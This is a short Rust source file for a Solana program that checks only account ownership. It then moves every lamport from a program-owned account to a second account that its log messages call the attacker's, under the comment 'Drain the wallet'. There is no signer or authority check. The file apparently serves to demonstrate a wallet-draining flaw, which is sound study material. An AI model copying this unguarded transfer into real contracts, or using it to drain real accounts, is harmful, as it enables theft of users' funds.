use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();

    let owned_account = next_account_info(accounts_iter)?;
    let owner = next_account_info(accounts_iter)?;
    let lamports = owned_account.lamports();

    msg!("Owned Account: {:?}", owned_account);
    msg!("Attacker's Account : {:?}", owner);

    if owned_account.owner != program_id {
        msg!("This account is not owned by the program");
        return Err(ProgramError::IncorrectProgramId);
    }

    // Drain the wallet
    **owned_account.lamports.borrow_mut() -= lamports;
    **owner.lamports.borrow_mut() += lamports;

    msg!(
        "Transferred {:?} lamports from the owned account to the attacker",
        lamports
    );

    Ok(())
}

